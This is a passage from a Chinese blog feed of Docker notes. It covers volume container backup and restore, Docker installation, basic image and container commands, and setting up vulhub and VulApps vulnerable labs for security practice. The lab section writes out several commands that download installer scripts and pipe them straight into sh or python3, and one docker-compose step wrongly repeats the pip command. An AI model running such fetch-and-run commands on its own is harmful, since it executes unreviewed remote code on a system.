title="先说结论"></a>先说结论</h4><blockquote><ul><li><p>挂载容器就不用连接到宿主机的目录去，可以隐藏服务器的实际目录</p></li><li><p>Docker中一个数据卷还在被容器使用那么他就会一直存在，</p></li><li><p>数据卷容器的作用仅仅是传递数据卷的配置，没有其他用处。</p></li><li><p><code>docker rm 容器id</code> ：删除数据卷容器之后，挂载了这个数据卷容器的容器仍然可以访问数据卷容器挂在的目录。通过数据卷容器挂载数据卷容器的作用仅仅是一个数据卷配置信息的传递（就是数据地址的引用）。</p></li><li><p>但是我们在docker文件目录里面仍然可以找到遗留下来的数据卷！！</p><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/docker/volumes</span><br></pre></td></tr></table></figure></blockquote></li></ul></blockquote><blockquote><p>从下面这几个步骤体会上面几句话</p></blockquote><ol><li>创建包含数据卷的镜像，使用镜像创建容器：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it --name dvt4  jingxiang</span><br><span class="line">或者 </span><br><span class="line">docker run -it --name=dvt4  -v ~/ywjuan:/ywjuan ubuntu /bin/bash</span><br></pre></td></tr></table></figure><ol start="2"><li><p>可以看到在容器中创建了数据卷文件目录，然后在目录中创建文件，并写入数据</p></li><li><p>退出容器</p></li><li><p>创建一个容器来挂载刚才这个容器，进入新的容器，看有没有文件</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$docker run -it --name dvt5 --volumes-from dvt4 ubuntu /bin/bash</span><br></pre></td></tr></table></figure><ol start="5"><li>再创建一个容器来挂载刚才这个容器,看看有没有文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$docker run -it --name dvt6 --volumes-from dvt4 ubuntu /bin/bash </span><br></pre></td></tr></table></figure><ol start="6"><li>查看信息</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$docker inspect --format=”&#123;&#123;.Volumes&#125;&#125;” dvt5 dvt6</span><br></pre></td></tr></table></figure><p>返回的是数据卷的目录不是数据卷容器的信息，dvt5 dvt6信息是一致的。修改一个容器其他容器也改了。</p><ol start="7"><li><code>$docker rm dvt4</code> ：删除数据卷容器，挂载了这个数据卷容器的容器仍然可以访问数据卷容器挂在的目录。通过数据卷容器挂载数据卷容器的作用仅仅是一个数据卷配置信息的传递（就是数据地址的引用）。</li></ol><blockquote><p>再从这个例子体会数据卷</p></blockquote><ol><li>创建新的数据卷容器dvt8，</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it --name dvt8  jingxiang</span><br><span class="line">或者 </span><br><span class="line">docker run -it --name=dvt8  -v ~/ywjuan:/ywjuan ubuntu /bin/bash）</span><br></pre></td></tr></table></figure><ol start="2"><li>dvt9挂载dvt8</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it --name dvt9  --volumes-from dvt8 ubuntu /bin/bash</span><br></pre></td></tr></table></figure><ol start="3"><li>删除dvt8和其数据卷：</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> -v dvt8</span><br><span class="line">docker restart dvt9</span><br><span class="line">docker attach dvt9</span><br><span class="line"><span class="comment">#ls : 容器9中依然可以访问容器8挂载的数据卷。Docker中一个数据卷还在被容器使用那么他就会一直存在，数据卷容器的作用仅仅是传递数据卷的配置，没有其他用处。</span></span><br></pre></td></tr></table></figure><ol start="4"><li>Docker数据卷的备份和还原迁移：</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="variable">$docker</span> run --volumes-from [container name] -v $(<span class="built_in">pwd</span>):/backup ubuntu tar cvf /backup/backup.tar [container data volume]</span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line">--volumes-from  : 挂载一个容器。</span><br><span class="line">-v ：指定保存数据的路径。</span><br><span class="line">tar  cvf ：是容器运行时执行的命令，执行的是一个压缩文件tar命令，将要备份容器中的目录压缩到指定的目录下。</span><br></pre></td></tr></table></figure><h4 id="备份-amp-还原"><a href="#备份-amp-还原" class="headerlink" title="备份&amp;还原:"></a>备份&amp;还原:</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209272306530.png" alt="image-20220927230617318"></p><p>若要备份一个数据容器的数据，则其数据卷是备份在一个容器上，这个容器是挂载了要备份数据的容器。</p><p>执行备份命令的容器既挂载了一个需要备份的数据卷（volumes-from本就是对数据地址的引用）又挂载了一个备份数据的数据卷。（数据卷就是数据，一个文件或者文件夹）</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="variable">$docker</span> restart dvt5 : 重启dvt5容器</span><br><span class="line"><span class="variable">$docker</span> attach dvt5 : 登陆这个容器</span><br><span class="line"><span class="comment">#ls  :  现在要备份datavolume1这个目录</span></span><br><span class="line"><span class="comment">#exit : 退出这个容器</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将一个包含数据卷的容器中的数据，通过一个容器执行一个压缩命令，从而将数据备份出来。</span></span><br><span class="line"><span class="variable">$docker</span>  run  --volumes-from  dvt5  -v  ~/backup1:/backup2:wr  --name=dvt10  ubuntu  tar  cvf  /backup/dvt5.tar  /datavolume1</span><br><span class="line"><span class="comment">#这个备份容器的名字叫做dvt10，挂载在dvt5上，宿主机目录是backup1，容器中的目录是backup2，权限是读写权限，运行ubuntu系统，压缩之后的路径是/backup/dvt5.tar，/datavolume1是需要压缩备份的目录</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#解压缩命令实现备份数据的还原：</span></span><br><span class="line"><span class="variable">$docker</span> run --volumes-from [container name] -v $(<span class="built_in">pwd</span>):/backup ubuntu tar xvf /backup/backup.tar [container data volume]</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo docker run --<span class="built_in">rm</span> --volumes-from DATA -v $(<span class="built_in">pwd</span>):/backup busybox tar cvf /backup/backup.tar /data</span><br><span class="line"><span class="comment">#参数:</span></span><br><span class="line">--<span class="built_in">rm</span>: 容器退出时移除</span><br><span class="line">--volumes-from DATA: 附加到 DATA 容器共享的卷</span><br><span class="line">-v $(<span class="built_in">pwd</span>):/backup: 绑定挂载当前目录到容器中；将 tar 文件写入</span><br><span class="line">busybox：一个小而简单的图像 - 有利于快速维护</span><br><span class="line">tar cvf /backup/backup.tar /data: 创建 /data 目录中所有文件的未压缩 tar 文件</span><br></pre></td></tr></table></figure><h2 id="自己的尝试"><a href="#自己的尝试" class="headerlink" title="自己的尝试"></a>自己的尝试</h2><blockquote><p>问题：从VPS的docker将Moodle容器相关的containers和volumes复制到本地，将其完整的保存下来复用</p></blockquote><p>在解决问题过程中查阅了很多资料，很少就看到一个清楚的过程，或者说我表述方式不对？</p><blockquote><p><code>/var/lib/docker/</code>目录下的文件需要注意 和容器相关文件，在volumes下面就是数据卷</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/docker/volumes</span><br></pre></td></tr></table></figure></blockquote><p>要在本地复制一个一模一样的容器，需要将container和volumes复制到本地，另外，需要注意如果挂载了共享目录或者是lamp app目录，可能会有两个的volumes目录文件，不要忘记复制！复制的时候一定要细心！！</p><p>我是将在vps的相关文件夹都复制过来 再重命名为kali创建容器的volumeid</p><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.cnblogs.com/zhuxiaojie/p/5947138.html">docker对数据卷容器进行备份</a>)</li><li><a href="https://blog.csdn.net/geek_xiong/article/details/92030035">Docker—数据卷容器（volumes-from容器间传递共享）</a></li><li><a href="https://blog.csdn.net/u014381782/article/details/107104145/">完整的docker打包流程</a></li><li><a href="https://www.bookstack.cn/read/dockerguide/chapter_fastlearn-docker_run---volumes-from.md">https://www.bookstack.cn/read/dockerguide/chapter_fastlearn-docker_run---volumes-from.md</a></li><li><a href="https://yeasy.gitbook.io/docker_practice/data_management/volume">https://yeasy.gitbook.io/docker_practice/data_management/volume</a></li><li><a href="http://cn.voidcc.com/question/p-yystvqqy-ox.html">http://cn.voidcc.com/question/p-yystvqqy-ox.html</a></li><li><a href="https://blog.csdn.net/geek_xiong/article/details/92030035">Docker—数据卷容器（volumes-from容器间传递共享）</a></li><li><a href="https://www.bookstack.cn/read/dockerguide/chapter_fastlearn-docker_run---volumes-from.md">https://www.bookstack.cn/read/dockerguide/chapter_fastlearn-docker_run---volumes-from.md</a></li><li><a href="https://stackoverflow.com/questions/26331651/how-can-i-backup-a-docker-container-with-its-data-volumes">https://stackoverflow.com/questions/26331651/how-can-i-backup-a-docker-container-with-its-data-volumes</a></li><li><a href="https://stackoverflow.com/questions/21597463/how-to-port-data-only-volumes-from-one-host-to-another/23778599#23778599">https://stackoverflow.com/questions/21597463/how-to-port-data-only-volumes-from-one-host-to-another/23778599#23778599</a></li><li><a href="https://github.com/discordianfish/docker-backup">Backup and Restore Docker Volume Containers</a></li><li><a href="https://gist.github.com/pirate/265e19a8a768a48cf12834ec87fb0eed">https://gist.github.com/pirate/265e19a8a768a48cf12834ec87fb0eed</a></li><li><a href="https://www.cnblogs.com/zhuxiaojie/p/5947138.html">docker对数据卷容器进行备份</a></li><li><a href="https://www.cnblogs.com/yaowen/p/8431710.html">Docker容器的数据卷（data volume），数据卷容器，数据卷的备份和还原。</a></li><li><a href="https://blog.csdn.net/weixin_39603132/article/details/113021902?utm_medium=distribute.wap_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-10-113021902.wap_agg_so&utm_term=docker%E5%AE%8C%E6%95%B4%E5%A4%87%E4%BB%BD%E5%AE%B9%E5%99%A8">docker镜像备份恢复_备份 Docker 镜像容器和数据</a></li><li><a href="https://docs.docker.com/storage/">官方文档-存储概述</a></li><li><a href="https://docs.docker.com/storage/volumes/">官方文档-卷</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker - 学习</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Docker/Docker-%E5%AD%A6%E4%B9%A0.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Docker/Docker-%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>docker学习</p><h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><h2 id="Docker是什么"><a href="#Docker是什么" class="headerlink" title="Docker是什么"></a>Docker是什么</h2><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中,然后发布到任何流行的Linux机器或Windows 机器上,也可以实现虚拟化,容器是完全使用沙箱机制,相互之间不会有任何接口。</p><h2 id="Docker组成部分"><a href="#Docker组成部分" class="headerlink" title="Docker组成部分"></a>Docker组成部分</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Docker Client客户端</span><br><span class="line">Docker Daemon守护进程</span><br><span class="line">Docker Image镜像</span><br><span class="line">Docker Container 容器</span><br></pre></td></tr></table></figure><blockquote><p>几个和dockers关系密切的概念：</p><ul><li>仓库hub–如dockerhub，保存镜像的码头，可以从不同的hub获取官方或者别人的镜像</li><li>镜像image–集装箱，镜像可以创建容器</li><li>容器container–</li></ul></blockquote><h2 id="注意！"><a href="#注意！" class="headerlink" title="注意！"></a>注意！</h2><blockquote><ul><li>建议在Linux上使用docker，windows上已经使用了VMware的虚拟技术和Windows的虚拟化技术有冲突，当使用VMware的时候就要关闭Windows的虚拟化技术</li><li>docker使用需要有root权限</li></ul></blockquote><h1 id="Docker环境安装"><a href="#Docker环境安装" class="headerlink" title="Docker环境安装"></a>Docker环境安装</h1><ol><li>添加 Docker PGP key（<strong>PGP</strong>（英语：Pretty Good Privacy，中文翻译“优良保密协议”）是一套用于消息加密、验证的应用程序，采用IDEA的散列算法作为加密与验证之用）（信任 Docker 的 GPG 公钥:）</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><ol start="2"><li>配置 Docker APT repository</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list</span><br><span class="line"><span class="comment">#tee命令 用于将数据重定向到文件，另一方面还可以提供一份重定向数据的副本作为后续命令的stdin。简单的说就是把数据重定向到给定文件和屏幕上。</span></span><br></pre></td></tr></table></figure><blockquote><p>对于 amd64 架构的计算机，添加软件仓库:</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository </span><br><span class="line">\   <span class="string">&quot;deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian </span></span><br><span class="line"><span class="string">\   <span class="subst">$(lsb_release -cs)</span> </span></span><br><span class="line"><span class="string">\   stable&quot;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>更新 APT</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><ol start="4"><li>如果安装了旧版本的 Docker ，先卸载它们</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt remove docker docker-engine docker.io</span><br></pre></td></tr></table></figure><ol start="5"><li>安装 Docker</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure><ol start="6"><li>查看 Docker 状态</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure><ol start="7"><li>启动 Docker</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><ol start="8"><li>开机自动启动</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><ol start="9"><li>安装 docker-compose</li></ol><blockquote><ul><li><a href="https://blog.csdn.net/pushiqiang/article/details/78682323">docker-compose教程（安装，使用, 快速入门）</a></li><li><a href="https://www.runoob.com/docker/docker-compose.html">https://www.runoob.com/docker/docker-compose.html</a></li></ul></blockquote><p>对多个docker进行操作，启动运行等等，或者是一键搭建环境等待~~都是别人写好的脚本</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/v2.1.0/docker-compose-`<span class="built_in">uname</span> -s`-`<span class="built_in">uname</span> -m` &gt; /usr/local/bin/docker-compose </span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><ol start="10"><li>配置 docker 加速器  ：</li></ol><blockquote><p>阿里云镜像加速 <a href="https://help.aliyun.com/document_detail/60750.html">https://help.aliyun.com/document_detail/60750.html</a></p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://xxxxx.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h1 id="Docker基础操作"><a href="#Docker基础操作" class="headerlink" title="Docker基础操作"></a>Docker基础操作</h1><h2 id="Docker镜像操作"><a href="#Docker镜像操作" class="headerlink" title="Docker镜像操作"></a>Docker镜像操作</h2><h3 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span> -a</span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"><span class="comment">#REPOSITORY：镜像所在的仓库名称</span></span><br><span class="line"><span class="comment">#TAG：镜像标签（对同一镜像的不同版本区分）latest就是最新的，也可以标记版本号 </span></span><br><span class="line"><span class="comment">#IMAGEID：镜像ID</span></span><br><span class="line"><span class="comment">#CREATED：镜像的创建日期(不是获取该镜像的日期)</span></span><br><span class="line"><span class="comment">#SIZE：镜像大小</span></span><br></pre></td></tr></table></figure><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search &quot;查找仓库里的镜像&quot;</span><br><span class="line">docker image pull library/hello-world</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker image pull：抓取 image 文件的命令</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">library/hello-world：image 文件在仓库里面的位置</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">library：是 image 文件所在的组</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hello-world：是 image 文件的名字</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">由于 Docker 官方提供的 image 文件，都放在library组里面，所以它的是默认组，可以省略。因此，上面的命令可以写成下面这样:</span></span><br><span class="line">docker image pull hello-world</span><br></pre></td></tr></table></figure><h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker image <span class="built_in">rm</span> 镜像名或镜像<span class="built_in">id</span></span><br><span class="line">docker rmi 镜像名或镜像<span class="built_in">id</span></span><br><span class="line"><span class="comment">#一个标准的镜像名是：repository：Tag组成的完整的镜像名，因为有许多镜像的都是同一个名字，但是版本号不一样，通过不同的tag区分。</span></span><br><span class="line"><span class="comment">#如helloworld：V1和helloworld：V2</span></span><br><span class="line"><span class="comment">#如：</span></span><br><span class="line">docker image <span class="built_in">rm</span> hello-world</span><br><span class="line">docker rmi feb5d9fea6a5</span><br><span class="line"><span class="comment">#注意：正在运行容器的镜像是无法删除的</span></span><br></pre></td></tr></table></figure><h2 id="Docker容器操作"><a href="#Docker容器操作" class="headerlink" title="Docker容器操作"></a>Docker容器操作</h2><h3 id="重命名容器："><a href="#重命名容器：" class="headerlink" title="重命名容器："></a>重命名容器：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker rename CONTAINER NEW_NAME</span><br></pre></td></tr></table></figure><h3 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run [option] 镜像名 [向启动容器中传入的命令]</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">常用可选参数说明：</span></span><br><span class="line">-i 表示以“交互模式”运行容器</span><br><span class="line">-t 表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即分配一个伪终端。</span><br><span class="line">--name 为创建的容器命名</span><br><span class="line">-v 表示目录映射关系(前者是宿主机目录，后者是映射到宿主机上的目录，即 宿主机目录:容器中目录)，可以使 用多个-v 做多个目录或文件映射。注意:最好做目录映射，在宿主机上做修改，然后 共享到容器上。</span><br><span class="line">-d 在run后面加上-d参数,则会创建一个守护式容器在后台运行(这样创建容器后不会自动登录容器，如果只加-i -t 两个参数，创建后就会自动进去容器)。</span><br><span class="line">-p 表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p做多个端口映射</span><br><span class="line">-e 为容器设置环境变量</span><br><span class="line">--network=host 表示将主机的网络环境映射到容器中，容器的网络与主机相同</span><br></pre></td></tr></table></figure><h3 id="交互式容器"><a href="#交互式容器" class="headerlink" title="交互式容器"></a>交互式容器</h3><blockquote><p>关于交互式容器有一个入口点entrypoint的参数，这个会在下面讲到~~~</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建一个交互式容器，并命名为mycentos</span></span><br><span class="line">docker run -it --name=mycentos centos /bin/bash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/bash——[向启动容器中传入的命令]</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">即进入容器后启动bash终端，结合-it命令就会得到一个交互式bash终端。在容器中可以随意执行linux命令，就是一个ubuntu的环境，当执行<span class="built_in">exit</span>命令退出时，该容器也随之停止。</span></span><br></pre></td></tr></table></figure><h3 id="守护式容器"><a href="#守护式容器" class="headerlink" title="守护式容器"></a>守护式容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建一个守护式容器，并命名为mycentos2</span></span><br><span class="line">docker run -dit --name=mycentos2 centos</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果对于一个需要长期运行的容器来说，我们可以创建一个守护式容器。在容器内部<span class="built_in">exit</span>退出时，容器也不会停止。</span></span><br></pre></td></tr></table></figure><h3 id="进入运行容器"><a href="#进入运行容器" class="headerlink" title="进入运行容器"></a>进入运行容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器名或容器id 进入后执行的第一个命令</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">例如：</span></span><br><span class="line">docker exec -it mycentos2 /bin/bash</span><br></pre></td></tr></table></figure><h3 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps列出容器</span><br><span class="line"><span class="comment">#列出本机正在运行的容器</span></span><br><span class="line">docker container <span class="built_in">ls</span></span><br><span class="line"><span class="comment">#列出本机所有容器，包括已经终止运行的</span></span><br><span class="line">docker container <span class="built_in">ls</span> --all</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取容器/镜像的元数据，即查看镜像或者容器的信息</span></span><br><span class="line">docker inspect imageid或者containerid</span><br></pre></td></tr></table></figure><h3 id="停止与启动容器"><a href="#停止与启动容器" class="headerlink" title="停止与启动容器"></a>停止与启动容器</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#停止一个已经在运行的容器</span></span><br><span class="line">docker container stop 容器名或容器<span class="built_in">id</span></span><br><span class="line">docker stop 容器名或容器<span class="built_in">id</span></span><br><span class="line"><span class="comment">#启动一个已经停止的容器</span></span><br><span class="line">docker container start 容器名或容器<span class="built_in">id</span></span><br><span class="line">docker start 容器名或容器<span class="built_in">id</span></span><br><span class="line"><span class="comment">#kill掉一个已经在运行的容器</span></span><br><span class="line">docker container <span class="built_in">kill</span> 容器名或容器<span class="built_in">id</span></span><br><span class="line">docker <span class="built_in">kill</span> 容器名或容器<span class="built_in">id</span></span><br><span class="line"></span><br><span class="line">--restart=always ： 开机启动，失败也会一直重启；</span><br><span class="line">--restart=on-failure:10 ： 表示最多重启10次</span><br></pre></td></tr></table></figure><blockquote><p> <a href="https://www.cnblogs.com/pyspang/p/13567879.html">docker参数–restart&#x3D;always</a></p></blockquote><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker container <span class="built_in">rm</span> 容器名或容器<span class="built_in">id</span></span><br><span class="line">docker <span class="built_in">rm</span> 容器名或容器<span class="built_in">id</span></span><br><span class="line"><span class="comment">#注意：rmi是删除镜像</span></span><br></pre></td></tr></table></figure><h2 id="容器保存为镜像"><a href="#容器保存为镜像" class="headerlink" title="容器保存为镜像"></a>容器保存为镜像</h2><h3 id="简单保留容器"><a href="#简单保留容器" class="headerlink" title="简单保留容器"></a>简单保留容器</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker commit 容器名 镜像名</span><br><span class="line">docker commit mycentos3 mycentos3</span><br><span class="line"><span class="comment">#可用参数</span></span><br><span class="line">-a :提交的镜像作者；</span><br><span class="line">-c :使用Dockerfile指令来创建镜像；</span><br><span class="line">-m :提交时的说明文字；</span><br><span class="line">-p :在commit时，将容器暂停。</span><br><span class="line"><span class="comment">#imagexxx 是新创建的镜像的名字</span></span><br></pre></td></tr></table></figure><h3 id="镜像备份与迁移"><a href="#镜像备份与迁移" class="headerlink" title="镜像备份与迁移"></a>镜像备份与迁移</h3><h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可以通过save命令将镜像打包成文件，拷贝给别人使用</span></span><br><span class="line"><span class="comment"># 当前路径下会生成一个xxx.tar</span></span><br><span class="line">docker save -o 保存的文件名 镜像名</span><br><span class="line">docker save -o ./mycentos3.tar mycentos3</span><br><span class="line"><span class="comment">#对方在拿到镜像文件后，可以通过load方法，将镜像加载到本地</span></span><br><span class="line">docker load -i ./centos.tar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#将tar包再次压缩为gz包</span></span><br><span class="line"><span class="comment"># 当前路径生成一个xxx.tar.gz压缩包</span></span><br><span class="line"> tar -zcvf moodle-ok.tar.gz moodle-ok.tar</span><br></pre></td></tr></table></figure><h4 id="迁移（复用镜像生成容器）"><a href="#迁移（复用镜像生成容器）" class="headerlink" title="迁移（复用镜像生成容器）"></a>迁移（复用镜像生成容器）</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将tar.gz 挪到其他服务器</span></span><br><span class="line"><span class="comment">#将tar.gz 解压缩，会生成一个tar包</span></span><br><span class="line">tar -zxvf moodle-ok.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#将tar包生成镜像</span></span><br><span class="line">docker  load  &lt;  moodle-ok.tar     <span class="comment"># 生成的镜像跟之前打包的镜像名称一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将镜像生成容器</span></span><br><span class="line">docker run -dit -p <span class="string">&quot;80:80&quot;</span> -p <span class="string">&quot;3306:3306&quot;</span> -v <span class="variable">$&#123;PWD&#125;</span>/share:/share mattrayner/lamp:build-210-2004-php7</span><br><span class="line">docker <span class="built_in">exec</span> -it c0 bash</span><br></pre></td></tr></table></figure><blockquote><p>但如果想对docker的数据卷进行备份，也就是备份docker运行所产生的数据，该如何操作呢？</p></blockquote><h3 id="docker对容器数据卷进行备份完整保存容器"><a href="#docker对容器数据卷进行备份完整保存容器" class="headerlink" title="docker对容器数据卷进行备份完整保存容器"></a>docker对容器数据卷进行备份<strong>完整保存容器</strong></h3><h1 id="Docker搭建漏洞靶场"><a href="#Docker搭建漏洞靶场" class="headerlink" title="Docker搭建漏洞靶场"></a>Docker搭建漏洞靶场</h1><h2 id="vulhub"><a href="#vulhub" class="headerlink" title="vulhub"></a>vulhub</h2><blockquote><ul><li><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></li><li><a href="https://hub.docker.com/u/vulhub">https://hub.docker.com/u/vulhub</a></li><li><a href="https://vulhub.org/#/docs">https://vulhub.org/#/docs</a></li><li><a href="https://www.cnblogs.com/zzjdbk/p/13068116.html">https://www.cnblogs.com/zzjdbk/p/13068116.html</a></li></ul></blockquote><p>Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 安装docker</span><br><span class="line">Centos : yum install docker</span><br><span class="line">Ubuntu/kali : apt install docker.io</span><br><span class="line">脚本安装: curl -s https://get.docker.com/ | sh</span><br><span class="line">windows: docker desktop for windows</span><br><span class="line">macos：docker for Mac</span><br><span class="line">2. 设置dockerhub加速器</span><br><span class="line">https://www.daocloud.io/mirror</span><br><span class="line">Linux ：curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br><span class="line">3. 安装docker-compose</span><br><span class="line">➢ 安装pip：curl -s https://bootstrap.pypa.io/get-pip.py | python3</span><br><span class="line">➢ 安装docker-compose：curl -s https://bootstrap.pypa.io/get-pip.py | python3 </span><br><span class="line">4. 下载vulhub</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">启动环境测试 - weblogic week_password</span><br><span class="line">➢ 首先进入vulhub/weblogic/week_passwrod目录</span><br><span class="line">➢ docker-compose up -d 启动环境</span><br><span class="line">➢ docker ps -a  /docker container ls -a  查看容器信息</span><br><span class="line">➢ docker-compose down 关闭环境</span><br></pre></td></tr></table></figure><h2 id="vulnapp"><a href="#vulnapp" class="headerlink" title="vulnapp"></a>vulnapp</h2><blockquote><ul><li><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a></li><li><a href="https://hub.docker.com/r/medicean/vulapps">https://hub.docker.com/r/medicean/vulapps</a></li></ul></blockquote><p>打开浏览器访问<a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a> 查看漏洞所对应的目录下的readme文件然后复制粘贴到服务器上即可。</p><p>以复现安全工具环境巡风为例：</p><ol><li>拉取镜像到本地</li></ol><figure 